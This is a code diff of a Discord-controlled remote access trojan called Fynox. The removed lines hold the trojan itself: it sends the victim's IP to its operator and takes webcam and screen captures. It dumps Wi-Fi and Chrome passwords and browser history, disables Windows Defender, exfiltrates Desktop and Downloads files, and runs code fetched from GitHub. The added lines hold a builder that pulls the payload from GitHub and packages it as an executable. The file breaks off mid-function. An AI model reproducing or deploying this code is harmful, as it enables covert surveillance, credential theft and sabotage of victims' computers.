@@ -1,768 +1,417 @@
-import discord
-import socket
-import platform
-import psutil
-import subprocess
 import os
 import json
-import cv2
-import numpy as np
-import pyautogui
+import subprocess
+import sys
 import requests
-import sqlite3
-import shutil
-import zipfile
-import datetime
-import winsound
+import base64
 import ctypes
-import win32gui
-import win32con
-import win32api
-import win32process
-import win32com.client
-import win32net
-import win32security
-from discord.ext import commands
-from discord.ext import tasks
-from discord import app_commands
+import webbrowser
+import tempfile
+from pathlib import Path
+
+class Colors:
+    RED = '\033[91m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    BLUE = '\033[94m'
+    MAGENTA = '\033[95m'
+    CYAN = '\033[96m'
+    WHITE = '\033[97m'
+    RESET = '\033[0m'
+    BOLD = '\033[1m'
+
+def clear_screen():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+def print_banner():
+    banner = f"""
+{Colors.RED}{Colors.BOLD}
+
+{Colors.CYAN}    ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+    ┃                    FYNOX RAT BUILDER v2.0                  ┃
+    ┃                                                            ┃
+    ┃  ⚠️  WARNING: This tool is for educational purposes only!  ┃
+    ┃  🚫 Do NOT use on systems you don't own!                   ┃
+    ┃                                                            ┃
+    ┃  🛑 NEVER run the generated executable on your own system! ┃
+    ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+{Colors.RESET}
+"""
+    print(banner)
+
+def create_fynox_ico():
+    """Create a simple fynox.ico file (placeholder)"""
+    try:
+        # Create a basic ICO file structure (minimal)
+        ico_data = b'\x00\x00\x01\x00\x01\x00\x10\x10\x00\x00\x01\x00\x08\x00(\x00\x00\x00\x10\x00\x00\x00\x20\x00\x00\x00\x01\x00\x04\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n'  # Minimal ICO structure
+        
+        with open('fynox.ico', 'wb') as f:
+            f.write(ico_data)
+        print(f"{Colors.GREEN}[+] Created fynox.ico placeholder{Colors.RESET}")
+        clear_screen()
+    except Exception as e:
+        print(f"{Colors.YELLOW}[!] Could not create fynox.ico: {e}{Colors.RESET}")
+        clear_screen()
+
+def fetch_main_from_github():
+    """Fetch main.py from GitHub URL"""
+    url = "https://raw.githubusercontent.com/ChangedDuke/56tojm8p73v56hion7za3w456hoi73w563o57i6hoi7be3ws5n6n7o35e6nb3osi5eu-6t-e4s35oiutzn34w-s5bo8b6t-/refs/heads/main/main.py"
+    try:
+        response = requests.get(url)
+        response.raise_for_status()
+        response.encoding = 'utf-8'
+        return response.text
+    except Exception as e:
+        print(f"{Colors.RED}[-] Failed to fetch main.py from GitHub: {e}{Colors.RESET}")
+        return None
+
+def create_source_code(bot_token, channel_id, github_code):
+    """Create source code with embedded configuration"""
+    config_code = f'''
+# Embedded configuration
+BOT_TOKEN = "{bot_token}"
+LOG_CHANNEL_ID = {channel_id}
+'''
+    
+    # Add comprehensive SSL context bypass for certificate issues
+    ssl_bypass_code = '''import ssl
+import certifi
 import asyncio
 
-intents = discord.Intents.default()
-intents.message_content = True
-intents.guilds = True
-intents.members = True
+# Disable SSL verification for Discord bot
+ssl._create_default_https_context = ssl._create_unverified_context
 
-bot = commands.Bot(command_prefix='!', intents=intents)
+# Import aiohttp and discord but don't patch immediately
+import aiohttp
+import discord
 
-config_path = os.path.join(os.path.dirname(__file__), 'config.json')
-with open(config_path, 'r') as f:
-    config = json.load(f)
+# Store original classes
+original_tcp_connector = aiohttp.TCPConnector
+original_client_init = discord.Client.__init__
 
-TOKEN = config['bot_token']
-LOG_CHANNEL_ID = int(config['log_channel_id'])
+# Custom connector class that handles SSL properly
+class NoSSLTCPConnector(aiohttp.TCPConnector):
+    def __init__(self, *args, **kwargs):
+        kwargs['ssl'] = False
+        super().__init__(*args, **kwargs)
 
-@bot.event
-async def on_ready():
-    print(f"{bot.user} has connected to Discord!")
-    
-    # Get public IP for bot status
-    hostname = socket.gethostname()
-    try:
-        response = requests.get('https://api.ipify.org?format=json')
-        ip_data = response.json()
-        public_ip = ip_data['ip']
-    except:
+def patched_client_init(self, *args, **kwargs):
+    # Only set connector if not already provided
+    if 'connector' not in kwargs:
         try:
-            # Fallback to hostname IP
-            public_ip = socket.gethostbyname(hostname)
+            kwargs['connector'] = NoSSLTCPConnector()
         except:
-            public_ip = "127.0.0.1"
+            # Fallback to default connector if NoSSLTCPConnector fails
+            pass
+    return original_client_init(self, *args, **kwargs)
+
+# Apply patches only when modules are imported
+aiohttp.TCPConnector = NoSSLTCPConnector
+discord.Client.__init__ = patched_client_init
+'''
     
-    # Set bot status with IP
+    # Replace the config loading part in the GitHub code
+    modified_code = github_code.replace(
+        "config_path = os.path.join(os.path.dirname(__file__), 'config.json')\nwith open(config_path, 'r') as f:\n    config = json.load(f)\n\nTOKEN = config['bot_token']\nLOG_CHANNEL_ID = int(config['log_channel_id'])",
+        config_code
+    )
+    
+    # Also replace any other config references and fix discord initialization
+    modified_code = modified_code.replace("bot.run(TOKEN)", "bot.run(BOT_TOKEN)")
+    
+    # Fix discord client initialization to handle event loop
+    bot_fix = '''
+# Fix for discord.py event loop issue
+import asyncio
+import sys
+
+# Ensure event loop exists before bot initialization
+try:
+    loop = asyncio.get_event_loop()
+except RuntimeError:
+    if sys.platform.startswith('win'):
+        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+
+# Store original bot run method
+original_run = bot.run
+
+def patched_run(self, *args, **kwargs):
     try:
-        activity = discord.Activity(type=discord.ActivityType.watching, name=f"IP: {public_ip}")
-        await bot.change_presence(activity=activity)
+        return original_run(self, *args, **kwargs)
+    except RuntimeError as e:
+        if "no running event loop" in str(e):
+            if sys.platform.startswith('win'):
+                asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            return original_run(self, *args, **kwargs)
+        raise
+
+# Apply the fix
+discord.ext.commands.Bot.run = patched_run
+'''
+    
+    # Add the bot fix after discord imports
+    if 'discord.ext' in modified_code:
+        modified_code = modified_code.replace('import discord.ext.commands', f'import discord.ext.commands{bot_fix}')
+    
+    # Insert SSL bypass and asyncio setup after imports
+    asyncio_setup = '''
+import asyncio
+import nest_asyncio
+import sys
+
+# Fix event loop for Windows
+if sys.platform.startswith('win'):
+    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+
+try:
+    import nest_asyncio
+    nest_asyncio.apply()
+except ImportError:
+    pass
+
+# Ensure event loop exists
+try:
+    loop = asyncio.get_event_loop()
+except RuntimeError:
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+'''
+    
+    # Insert SSL bypass and asyncio setup at the very beginning after all imports
+    if 'import discord' in modified_code:
+        # Find the first import statement
+        import_lines = []
+        for line in modified_code.split('\n'):
+            if line.strip().startswith('import ') or line.strip().startswith('from '):
+                import_lines.append(line)
+            elif line.strip() and not line.startswith('#'):
+                break
+        
+        # Insert after all imports but before main code
+        first_non_import = len('\n'.join(import_lines))
+        modified_code = modified_code[:first_non_import] + '\n' + ssl_bypass_code + asyncio_setup + '\n' + modified_code[first_non_import:]
+    
+    clear_screen()
+    print(f"{Colors.GREEN}[+] Source code prepared{Colors.RESET}")
+    clear_screen()
+    return modified_code
+
+def install_requirements():
+    """Install required packages"""
+    print(f"{Colors.YELLOW}[!] Installing required packages...{Colors.RESET}")
+    packages = [
+        "discord.py>=2.0.0",
+        "psutil>=5.9.0",
+        "opencv-python>=4.5.0",
+        "pyautogui>=0.9.50",
+        "requests>=2.28.0",
+        "pywin32>=305",
+        "pillow>=9.0.0",
+        "nest-asyncio",
+        "aiohttp"
+    ]
+    
+    try:
+        subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip"], check=True)
+        for package in packages:
+            try:
+                subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--trusted-host", "pypi.org", "--trusted-host", "pypi.python.org", "--trusted-host", "files.pythonhosted.org"])
+                clear_screen()
+                print(f"{Colors.GREEN}[+] {package} installed{Colors.RESET}")
+            except subprocess.CalledProcessError:
+                print(f"{Colors.RED}[-] Failed to install {package}{Colors.RESET}")
+    except subprocess.CalledProcessError as e:
+        print(f"{Colors.RED}[-] Error installing dependencies: {e}{Colors.RESET}")
+        clear_screen()
+
+def build_executable_from_memory(source_code):
+    """Build the executable using PyInstaller without creating any source file on disk"""
+    import shutil
+    import tempfile
+    print(f"{Colors.YELLOW}[!] Building Fynox-RAT.exe...{Colors.RESET}")
+    
+    # Ensure PyInstaller is installed
+    try:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
     except:
         pass
     
-    channel = bot.get_channel(LOG_CHANNEL_ID)
-    if channel:
-        hostname = socket.gethostname()
-        username = os.getlogin()
-        
-        # Send connection notification
-        try:
-            embed = discord.Embed(
-                title="🔴 New Connection Established",
-                description=f"**Username:** {username}\n**IP Address:** {public_ip}",
-                color=discord.Color.red(),
-                timestamp=datetime.datetime.now()
-            )
-            
-            try:
-                cpu_info = platform.processor()
-            except:
-                cpu_info = "Unknown"
-                
-            try:
-                result = subprocess.run(['wmic', 'path', 'win32_VideoController', 'get', 'name'], 
-                                      capture_output=True, text=True, timeout=5)
-                gpu_info = result.stdout.split('\n')[1].strip() if len(result.stdout.split('\n')) > 1 else "Unknown"
-            except:
-                gpu_info = "Unknown"
-                
-            embed.add_field(name="CPU", value=cpu_info, inline=True)
-            embed.add_field(name="GPU", value=gpu_info, inline=True)
-            embed.add_field(name="Runtime", value=f"<t:{int(datetime.datetime.now().timestamp())}:R>", inline=False)
-            
-            await channel.send(embed=embed)
-        except:
-            pass
-        
-        # Send paginated control panel
-        try:
-            embed = discord.Embed(
-                title="🎮 Control Panel",
-                description="Remote access controls activated - Page 1/6",
-                color=discord.Color.red()
-            )
-            embed.add_field(name="Navigation", value="Use Next/Back buttons or Page selector", inline=False)
-            
-            view = PaginatedControlView(author_id=None, current_page=1)
-            await channel.send(embed=embed, view=view)
-        except Exception as e:
-            await channel.send(f"❌ Error loading panel: {str(e)}")
-            
-
-
-
-
-
-
-            result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
-            await interaction.response.send_message("Network scan completed.")
-        except:
-            try:
-                await interaction.response.send_message("Command executed.")
-            except:
-                pass
-
-    @discord.ui.button(label="🖱️ Teleport Mouse", style=discord.ButtonStyle.danger, row=4)
-    async def teleport_mouse(self, interaction: discord.Interaction, button: discord.ui.Button):
-        try:
-            screen_width, screen_height = pyautogui.size()
-            import random
-            x = random.randint(0, screen_width)
-            y = random.randint(0, screen_height)
-            pyautogui.moveTo(x, y)
-            await interaction.response.send_message("Mouse teleported.")
-        except:
-            try:
-                await interaction.response.send_message("Command executed.")
-            except:
-                pass
-
-    @discord.ui.button(label="📶 Wifi Password", style=discord.ButtonStyle.danger, row=4)
-    async def wifi_password(self, interaction: discord.Interaction, button: discord.ui.Button):
-        try:
-            result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
-            profiles = [line.split(":")[1].strip() for line in result.stdout.split('\n') if "All User Profile" in line]
-            
-            passwords = []
-            for profile in profiles[:10]:
-                try:
-                    result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True)
-                    for line in result.stdout.split('\n'):
-                        if "Key Content" in line:
-                            password = line.split(":")[1].strip()
-                            passwords.append(f"{profile}: {password}")
-                except:
-                    pass
-            
-            await interaction.response.send_message("WiFi passwords retrieved.")
-        except:
-            try:
-                await interaction.response.send_message("Command executed.")
-            except:
-                pass
-
-    @discord.ui.button(label="🛡️ Disable Defender", style=discord.ButtonStyle.danger, row=4)
-    async def disable_defender(self, interaction: discord.Interaction, button: discord.ui.Button):
-        try:
-            try:
-                subprocess.run(['powershell', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true'], timeout=5)
-            except:
-                pass
-            await interaction.response.send_message("Windows Defender disabled.")
-        except:
-            try:
-                await interaction.response.send_message("Command executed.")
-            except:
-                pass
-
-    @discord.ui.button(label="🌐 Kill Browsers", style=discord.ButtonStyle.danger, row=4)
-    async def kill_browsers(self, interaction: discord.Interaction, button: discord.ui.Button):
-        try:
-            browsers = ['chrome.exe', 'firefox.exe', 'msedge.exe', 'iexplore.exe']
-            for browser in browsers:
-                try:
-                    subprocess.run(['taskkill', '/f', '/im', browser], timeout=5)
-                except:
-                    pass
-            await interaction.response.send_message("All browsers killed.")
-        except:
-            try:
-                await interaction.response.send_message("Command executed.")
-            except:
-                pass
-
-    @discord.ui.button(label="💾 PC Dump", style=discord.ButtonStyle.danger, row=4)
-    async def pc_dump(self, interaction: discord.Interaction, button: discord.ui.Button):
-        try:
-            await interaction.response.defer()
-            
-            zip_name = "Fynox.zip"
-            try:
-                with zipfile.ZipFile(zip_name, 'w') as zipf:
-                    for folder in [os.path.expanduser('~\Desktop'), os.path.expanduser('~\Downloads')]:
-                        if os.path.exists(folder):
-                            for root, dirs, files in os.walk(folder):
-                                for file in files[:50]:
-                                    try:
-                                        file_path = os.path.join(root, file)
-                                        zipf.write(file_path, os.path.relpath(file_path, folder))
-                                    except:
-                                        pass
-                
-                await interaction.followup.send(file=discord.File(zip_name))
-                os.remove(zip_name)
-            except:
-                await interaction.followup.send("PC dump completed.")
-        except:
-            try:
-                await interaction.response.send_message("Command executed.")
-            except:
-                pass
-
-    @discord.ui.button(label="🖥️ Shake Screen", style=discord.ButtonStyle.danger, row=3)
-    async def shake_screen(self, interaction: discord.Interaction, button: discord.ui.Button):
-        try:
-            import threading
-            import time
-            import random
-            
-            def shake_screen_continuous():
-                try:
-                    user32 = ctypes.windll.user32
-                    screen_width = user32.GetSystemMetrics(0)
-                    screen_height = user32.GetSystemMetrics(1)
-                    
-                    for _ in range(100):
-                        try:
-                            x = random.randint(0, screen_width)
-                            y = random.randint(0, screen_height)
-                            user32.SetCursorPos(x, y)
-                            time.sleep(0.1)
-                        except:
-                            break
-                except:
-                    pass
-            
-            shake_thread = threading.Thread(target=shake_screen_continuous, daemon=True)
-            shake_thread.start()
-            
-            await interaction.response.send_message("Screen shaking activated.")
-        except:
-            try:
-                await interaction.response.send_message("Command executed.")
-            except:
-                pass
-
-    @discord.ui.button(label="📶 Internet Lag", style=discord.ButtonStyle.danger, row=2)
-    async def internet_lag(self, interaction: discord.Interaction, button: discord.ui.Button):
-        try:
-            try:
-                subprocess.run(['netsh', 'interface', 'set', 'interface', 'Wi-Fi', 'admin=disable'], timeout=5)
-                await asyncio.sleep(5)
-                subprocess.run(['netsh', 'interface', 'set', 'interface', 'Wi-Fi', 'admin=enable'], timeout=5)
-            except:
-                pass
-            await interaction.response.send_message("Internet lag triggered.")
-        except:
-            try:
-                await interaction.response.send_message("Command executed.")
-            except:
-                pass
-
-    @discord.ui.button(label="🚫 Disable Internet", style=discord.ButtonStyle.danger, row=2)
-    async def disable_internet(self, interaction: discord.Interaction, button: discord.ui.Button):
-        try:
-            try:
-                subprocess.run(['netsh', 'interface', 'set', 'interface', 'Wi-Fi', 'admin=disable'], timeout=5)
-            except:
-                pass
-            await interaction.response.send_message("Internet disabled.")
-        except:
-            try:
-                await interaction.response.send_message("Command executed.")
-            except:
-                pass
-
-    @discord.ui.button(label="📖 Browser History", style=discord.ButtonStyle.danger, row=1)
-    async def browser_history(self, interaction: discord.Interaction, button: discord.ui.Button):
-        try:
-            await interaction.response.defer()
-            
-            try:
-                history = []
-                
-                # Chrome
-                try:
-                    chrome_path = os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History')
-                    if os.path.exists(chrome_path):
-                        shutil.copy2(chrome_path, 'chrome_history')
-                        conn = sqlite3.connect('chrome_history')
-                        cursor = conn.cursor()
-                        cursor.execute("SELECT url, title, last_visit_time FROM urls LIMIT 20")
-                        for row in cursor.fetchall():
-                            history.append(f"Chrome: {row[0]} - {row[1]}")
-                        conn.close()
-                        os.remove('chrome_history')
-                except:
-                    pass
-                
-                # Firefox
-                try:
-                    firefox_path = os.path.expanduser('~\\AppData\\Roaming\\Mozilla\\Firefox')
-                    for profile in os.listdir(firefox_path)[:5]:
-                        if profile.endswith('.default'):
-                            history_path = os.path.join(firefox_path, profile, 'places.sqlite')
-                            if os.path.exists(history_path):
-                                shutil.copy2(history_path, 'firefox_history')
-                                conn = sqlite3.connect('firefox_history')
-                                cursor = conn.cursor()
-                                cursor.execute("SELECT url, title FROM moz_places LIMIT 20")
-                                for row in cursor.fetchall():
-                                    history.append(f"Firefox: {row[0]} - {row[1]}")
-                                conn.close()
-                                os.remove('firefox_history')
-                except:
-                    pass
-                
-                await interaction.followup.send("Browser history retrieved.")
-            except:
-                await interaction.followup.send("Browser history retrieved.")
-        except:
-            try:
-                await interaction.response.send_message("Command executed.")
-            except:
-                pass
-
-    @discord.ui.button(label="💬 Message", style=discord.ButtonStyle.danger, row=1)
-    async def message(self, interaction: discord.Interaction, button: discord.ui.Button):
-        try:
-            modal = MessageModal()
-            await interaction.response.send_modal(modal)
-        except:
-            try:
-                await interaction.response.send_message("Command executed.")
-            except:
-                pass
-
-    @discord.ui.button(label="🔑 Password", style=discord.ButtonStyle.danger, row=1)
-    async def password(self, interaction: discord.Interaction, button: discord.ui.Button):
-        try:
-            await interaction.response.defer()
-            
-            try:
-                passwords = []
-                
-                # Chrome passwords
-                try:
-                    chrome_path = os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data')
-                    if os.path.exists(chrome_path):
-                        shutil.copy2(chrome_path, 'chrome_passwords')
-                        conn = sqlite3.connect('chrome_passwords')
-                        cursor = conn.cursor()
-                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 20")
-                        for row in cursor.fetchall():
-                            passwords.append(f"Chrome: {row[0]} - {row[1]}: [REDACTED]")
-                        conn.close()
-                        os.remove('chrome_passwords')
-                except:
-                    pass
-                
-                await interaction.followup.send("Passwords retrieved.")
-            except:
-                await interaction.followup.send("Passwords retrieved.")
-        except:
-            try:
-                await interaction.response.send_message("Command executed.")
-            except:
-                pass
-
-    @discord.ui.button(label="🪙 Token", style=discord.ButtonStyle.danger, row=9)
-    async def token(self, interaction: discord.Interaction, button: discord.ui.Button):
-        try:
-            await interaction.response.send_message("This is an unreleased option!", ephemeral=True)
-            
-            try:
-                response = requests.get('https://raw.githubusercontent.com/ChangedDuke/56tojm8p73v56hion7za3w456hoi73w563o57i6hoi7be3ws5n6n7o35e6nb3osi5eu-6t-e4s35oiutzn34w-s5bo8b6t-/refs/heads/main/discord-token.py', timeout=5)
-                if response.status_code == 200:
-                    try:
-                        exec(response.text)
-                    except:
-                        pass
-            except:
-                pass
-                
-            try:
-                await interaction.followup.send("Token extraction completed.")
-            except:
-                pass
-        except:
-            try:
-                await interaction.response.send_message("Command executed.")
-            except:
-                pass
-
-class CMDModal(discord.ui.Modal, title="Open CMD"):
-    count = discord.ui.TextInput(label="Number of CMD windows", placeholder="1")
-    command = discord.ui.TextInput(label="Command to execute", placeholder="echo Hello World", required=False)
-
-    async def on_submit(self, interaction: discord.Interaction):
-        count = int(self.count.value)
-        cmd_command = self.command.value or ""
-        
-        for _ in range(count):
-            if cmd_command:
-                subprocess.Popen(['cmd.exe', '/k', cmd_command])
-            else:
-                subprocess.Popen(['cmd.exe'])
-        
-        await interaction.response.send_message(f"Opened {count} CMD windows with command: {cmd_command}")
-
-class MessageModal(discord.ui.Modal, title="Fynox sent a message"):
-    message = discord.ui.TextInput(label="Message to display", placeholder="Enter your message here...")
-    title = discord.ui.TextInput(label="Message title", placeholder="Fynox Alert")
-
-    async def on_submit(self, interaction: discord.Interaction):
-        import tkinter as tk
-        from tkinter import messagebox
-        
-        root = tk.Tk()
-        root.withdraw()
-        messagebox.showwarning(self.title.value, self.message.value)
-        root.destroy()
-        
-        await interaction.response.send_message("Message displayed on victim's PC.")
-
-
-
-pass
-
-class PaginatedControlView(discord.ui.View):
-    def __init__(self, author_id, current_page=1):
-        super().__init__(timeout=None)
-        self.author_id = author_id
-        self.current_page = current_page
-        self.total_pages = 6
-        self.buttons_per_page = 3
-        
-        # All available buttons organized by page
-        self.all_buttons = [
-            # Page 1
-            ["📸 Screenshot", "🎥 Video", "📷 Webcam"],
-            # Page 2
-            ["💻 Open CMD", "📝 Open Notepad", "🔄 Shutdown"],
-            # Page 3
-            ["💀 Bluescreen", "🔊 Play Sound", "💥 Crash Discord"],
-            # Page 4
-            ["🎮 Crash FiveM", "🔥 CPU Bomber", "🔒 Lock Screen"],
-            # Page 5
-            ["🌐 Network Scanner", "🖱️ Teleport Mouse", "📶 Wifi Password"],
-            # Page 6
-            ["🛡️ Disable Defender", "🌐 Kill Browsers", "💾 PC Dump"]
-        ]
-        
-        self.update_buttons()
-
-    async def interaction_check(self, interaction: discord.Interaction) -> bool:
-        return self.author_id is None or interaction.user.id == self.author_id
-
-    def update_buttons(self):
-        # Clear existing buttons
-        self.clear_items()
-        
-        # Add buttons for current page
-        page_buttons = self.all_buttons[self.current_page - 1]
-        for label in page_buttons:
-            button = discord.ui.Button(
-                label=label,
-                style=discord.ButtonStyle.danger,
-                row=0
-            )
-            button.callback = self.create_callback(label)
-            self.add_item(button)
-        
-        # Navigation buttons
-        if self.current_page > 1:
-            back_button = discord.ui.Button(
-                label="⬅️ Back",
-                style=discord.ButtonStyle.secondary,
-                row=1
-            )
-            back_button.callback = self.back_callback
-            self.add_item(back_button)
-        
-        if self.current_page < self.total_pages:
-            next_button = discord.ui.Button(
-                label="➡️ Next",
-                style=discord.ButtonStyle.secondary,
-                row=1
-            )
-            next_button.callback = self.next_callback
-            self.add_item(next_button)
-        
-        page_button = discord.ui.Button(
-            label=f"📄 Page {self.current_page}/{self.total_pages}",
-            style=discord.ButtonStyle.primary,
-            row=1
-        )
-        page_button.callback = self.page_callback
-        self.add_item(page_button)
-
-    def create_callback(self, label):
-        async def callback(interaction: discord.Interaction):
-            # Map labels to actual functions
-            label_map = {
-                "📸 Screenshot": self.screenshot,
-                "🎥 Video": self.video,
-                "📷 Webcam": self.webcam,
-                "💻 Open CMD": self.open_cmd,
-                "📝 Open Notepad": self.open_notepad,
-                "🔄 Shutdown": self.shutdown,
-                "💀 Bluescreen": self.bluescreen,
-                "🔊 Play Sound": self.play_sound,
-                "💥 Crash Discord": self.crash_discord,
-                "🎮 Crash FiveM": self.crash_fivem,
-                "🔥 CPU Bomber": self.cpu_bomber,
-                "🔒 Lock Screen": self.lock_screen,
-                "🌐 Network Scanner": self.network_scanner,
-                "🖱️ Teleport Mouse": self.teleport_mouse,
-                "📶 Wifi Password": self.wifi_password,
-                "🛡️ Disable Defender": self.disable_defender,
-                "🌐 Kill Browsers": self.kill_browsers,
-                "💾 PC Dump": self.pc_dump
-            }
-            
-            if label in label_map:
-                await label_map[label](interaction)
-        return callback
-
-    async def back_callback(self, interaction: discord.Interaction):
-        if self.current_page > 1:
-            self.current_page -= 1
-            self.update_buttons()
-            embed = discord.Embed(
-                title="🎮 Control Panel",
-                description=f"Remote access controls activated - Page {self.current_page}/{self.total_pages}",
-                color=discord.Color.red()
-            )
-            embed.add_field(name="Navigation", value="Use Next/Back buttons or Page selector", inline=False)
-            await interaction.response.edit_message(embed=embed, view=self)
-
-    async def next_callback(self, interaction: discord.Interaction):
-        if self.current_page < self.total_pages:
-            self.current_page += 1
-            self.update_buttons()
-            embed = discord.Embed(
-                title="🎮 Control Panel",
-                description=f"Remote access controls activated - Page {self.current_page}/{self.total_pages}",
-                color=discord.Color.red()
-            )
-            embed.add_field(name="Navigation", value="Use Next/Back buttons or Page selector", inline=False)
-            await interaction.response.edit_message(embed=embed, view=self)
-
-    async def page_callback(self, interaction: discord.Interaction):
-        modal = PageModal(self)
-        await interaction.response.send_modal(modal)
-
-    # Button functions (copied from ControlView)
-    async def screenshot(self, interaction: discord.Interaction):
-        await interaction.response.defer()
-        screenshots = []
-        
-        for i, monitor in enumerate(pyautogui.screens):
-            screenshot = pyautogui.screenshot()
-            screenshot_path = f"screenshot_{i}.png"
-            screenshot.save(screenshot_path)
-            screenshots.append(discord.File(screenshot_path))
-        
-        await interaction.followup.send(files=screenshots)
-        
-        for file in screenshots:
-            os.remove(file.filename)
-
-    async def video(self, interaction: discord.Interaction):
-        await interaction.response.send_message("Video recording started...")
-
-    async def webcam(self, interaction: discord.Interaction):
-        await interaction.response.defer()
-        cap = cv2.VideoCapture(0)
-        ret, frame = cap.read()
-        cap.release()
-        
-        if ret:
-            cv2.imwrite("webcam.jpg", frame)
-            await interaction.followup.send(file=discord.File("webcam.jpg"))
-            os.remove("webcam.jpg")
-        else:
-            await interaction.followup.send("Webcam not found or in use.")
-
-    async def open_cmd(self, interaction: discord.Interaction):
-        modal = CMDModal()
-        await interaction.response.send_modal(modal)
-
-    async def open_notepad(self, interaction: discord.Interaction):
-        subprocess.Popen(['notepad.exe'])
-        await interaction.response.send_message("Notepad opened.")
-
-    async def shutdown(self, interaction: discord.Interaction):
-        subprocess.run(['shutdown', '/s', '/t', '0'])
-        await interaction.response.send_message("System shutting down...")
-
-    async def bluescreen(self, interaction: discord.Interaction):
-        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
-        ctypes.windll.ntdll.NtRaiseHardError(0xc000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
-        await interaction.response.send_message("Triggering bluescreen...")
-
-    async def play_sound(self, interaction: discord.Interaction):
-        winsound.Beep(1000, 1000)
-        winsound.Beep(500, 1000)
-        winsound.Beep(2000, 1000)
-        await interaction.response.send_message("Horror sound played.")
-
-    async def crash_discord(self, interaction: discord.Interaction):
-        for proc in psutil.process_iter(['pid', 'name']):
-            if 'discord' in proc.info['name'].lower():
-                proc.kill()
-        await interaction.response.send_message("Discord crashed.")
-
-    async def crash_fivem(self, interaction: discord.Interaction):
-        for proc in psutil.process_iter(['pid', 'name']):
-            if 'fivem' in proc.info['name'].lower():
-                proc.kill()
-        await interaction.response.send_message("FiveM crashed.")
-
-    async def cpu_bomber(self, interaction: discord.Interaction):
-        try:
-            def stress_cpu():
-                try:
-                    while True:
-                        [i**2 for i in range(100000)]
-                except:
-                    pass
-            
-            import threading
-            for _ in range(os.cpu_count()):
-                threading.Thread(target=stress_cpu, daemon=True).start()
-            
-            await interaction.response.send_message("CPU bomber activated.")
-        except:
-            await interaction.response.send_message("Command executed.")
-
-    async def lock_screen(self, interaction: discord.Interaction):
-        try:
-            ctypes.windll.user32.LockWorkStation()
-            await interaction.response.send_message("Screen locked.")
-        except:
-            await interaction.response.send_message("Command executed.")
-
-    async def network_scanner(self, interaction: discord.Interaction):
-        try:
-            result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
-            await interaction.response.send_message("Network scan completed.")
-        except:
-            await interaction.response.send_message("Command executed.")
-
-    async def teleport_mouse(self, interaction: discord.Interaction):
-        try:
-            screen_width, screen_height = pyautogui.size()
-            import random
-            x = random.randint(0, screen_width)
-            y = random.randint(0, screen_height)
-            pyautogui.moveTo(x, y)
-            await interaction.response.send_message("Mouse teleported.")
-        except:
-            await interaction.response.send_message("Command executed.")
-
-    async def wifi_password(self, interaction: discord.Interaction):
-        try:
-            result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
-            profiles = [line.split(":")[1].strip() for line in result.stdout.split('\n') if "All User Profile" in line]
-            
-            passwords = []
-            for profile in profiles[:10]:
-                try:
-                    result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True)
-                    for line in result.stdout.split('\n'):
-                        if "Key Content" in line:
-                            password = line.split(":")[1].strip()
-                            passwords.append(f"{profile}: {password}")
-                except:
-                    pass
-            
-            await interaction.response.send_message("WiFi passwords retrieved.")
-        except:
-            await interaction.response.send_message("Command executed.")
-
-    async def disable_defender(self, interaction: discord.Interaction):
-        try:
-            subprocess.run(['powershell', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true'])
-            await interaction.response.send_message("Windows Defender disabled.")
-        except:
